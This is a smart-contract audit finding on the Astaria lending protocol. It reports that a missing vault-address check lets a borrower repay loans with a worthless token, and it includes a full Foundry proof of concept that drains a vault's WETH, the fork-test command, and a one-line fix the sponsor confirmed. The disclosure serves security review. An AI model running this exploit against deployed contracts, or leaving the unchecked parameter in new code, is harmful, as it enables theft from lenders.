[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault
Submitted byKoolex, also found bybin2chen
https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287
When a borrower takes a loan, Strategy details are passed along with other required data, and through the overallcommitToLienflow, all the data are validated except the StrategyDetailsParam.vault
struct StrategyDetailsParam {uint8 version;uint256 deadline;address vault;}
A borrower then can pass different vault’s address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.
https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849
Exploit Scenario
Allow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:
Bobowns an NFT.Bobsends his NFT to the collateral token contract.Bobcreates his own private vaultBobVaultwith an asset that he createdFakeTokenwhich doesn’t have any value in the market (e.g. just a new ERC20 token).Bobtakes a loan fromVault1(while passingBobVaultin the strategy param).Bobpay the loan with hisFakeTokeninsteadVault1’s asset.Bobthen repeats the steps from point 4 again tillVault1is drained.Bobnow has all the funds fromVault1withzerodebt.Strategisthas the same amount ofVault1’s funds but inFakeToken.
This exploit can be done with other vaults draining all the funds.To prove this, I’ve coded the scenario below.
Proof of Concept
Please create a file with a nameStealAllFundsExploit.t.solundersrc/test/directory.Add the following code to the file.
pragma solidity =0.8.17;import"forge-std/Test.sol";import {Authority} from"solmate/auth/Auth.sol";import {FixedPointMathLib} from"solmate/utils/FixedPointMathLib.sol";import {MockERC721} from"solmate/test/utils/mocks/MockERC721.sol";import {MultiRolesAuthority} from"solmate/auth/authorities/MultiRolesAuthority.sol";import {ERC721} from"gpl/ERC721.sol";import {SafeCastLib} from"gpl/utils/SafeCastLib.sol";import {IAstariaRouter, AstariaRouter} from"../AstariaRouter.sol";import {VaultImplementation} from"../VaultImplementation.sol";import {PublicVault} from"../PublicVault.sol";import {TransferProxy} from"../TransferProxy.sol";import {WithdrawProxy} from"../WithdrawProxy.sol";import"./TestHelpers.t.sol";import {MockERC20} from"solmate/test/utils/mocks/MockERC20.sol";import {IVaultImplementation} from"../interfaces/IVaultImplementation.sol";contract AstariaTest is TestHelpers {using FixedPointMathLibforuint256;using CollateralLookupforaddress;using SafeCastLibforuint256;ILienToken.Details public lienDetails =ILienToken.Details({maxAmount: 50 ether,rate: (uint256(1e16) * 150) / (365 days),duration: 10 days,maxPotentialDebt: 50 ether,liquidationInitialAsk: 500 ether});function__createPrivateVault(addressstrategist, address delegate,address token)internalreturns (address privateVault){vm.startPrank(strategist);privateVault = ASTARIA_ROUTER.newVault(delegate, token);vm.stopPrank();}functiontestPayWithDifferentAsset()public {TestNFT nft = new TestNFT(2);address tokenContract = address(nft);uint256 initialBalance = WETH9.balanceOf(address(this));// Create a private vault with WETH assetaddress privateVault = __createPrivateVault({strategist: strategistOne,delegate: address(0),token: address(WETH9)});_lendToPrivateVault(Lender({addr: strategistOne, amountToLend: 500 ether}),privateVault);// Send the NFT to Collateral contract and receive Collateral tokenERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,"");// generate valid termsuint256 amount = 50 ether; // amount to borrowIAstariaRouter.Commitment memory c = _generateValidTerms({vault: privateVault,strategist: strategistOne,strategistPK: strategistOnePK,tokenContract: tokenContract,tokenId: 1,lienDetails: lienDetails,amount: amount,stack: new ILienToken.Stack[](0)});// Attack starts here// The borrower an asset which has no valueinthe marketMockERC20 FakeToken = new MockERC20("USDC","FakeAsset", 18); // this could be any ERC token created by the attackerFakeToken.mint(address(this),500 ether);// The borrower creates a private vault with his/her assetaddress privateVaultOfBorrower = __createPrivateVault({strategist: address(this),delegate: address(0),token: address(FakeToken)});uint8 i;for( ; i < 10 ; i ++) {// Here is the exploit: commitToLien on privateVaultwhilepassing differentVaultinthe strategyc.lienRequest.strategy.vault = privateVaultOfBorrower;(uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(c,address(this));console.log("Take 50 ether loan#%d", (i+1));// necessary approvalsFakeToken.approve(address(TRANSFER_PROXY), amount);FakeToken.approve(address(LIEN_TOKEN), amount);// pay the loan with FakeTokenILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(stack[0].lien.collateralId,stack,uint8(0),amount);console.log("Repay 50 FakeToken loan#%d", (i+1));}// assertionconsole.log("------");// Vault is drainedconsole.log("PrivateVault Balance: %d WETH", WETH9.balanceOf(privateVault));assertEq(WETH9.balanceOf(privateVault), 0);// The borrower gets 500 etherconsole.log("Borrower Balance: %d WETH", WETH9.balanceOf(address(this)));assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);// strategist receives the fake tokenconsole.log("Strategist Balance: %d FakeToken", FakeToken.balanceOf(strategistOne));assertEq(FakeToken.balanceOf(strategistOne), 500 ether);}}
Then run the forge test command as follows (replace$FORK_URLwith your RPC URL):
forgetest--ffi --fork-url$FORK_URL--fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv
The test will pass. I’ve added comments in the code explaining the steps.
Note:The attack isn’t possible when using AstariaRouter
Recommended Mitigation Steps
In VaultImplementation’scommitToLienfunction, add the following validation:
require(address(this) == params.lienRequest.strategy.vault,"INVALID VAULT");
Run the PoC test above again, andtestPayWithDifferentAssetshould fail.
SantiagoGregory (Astaria) confirmed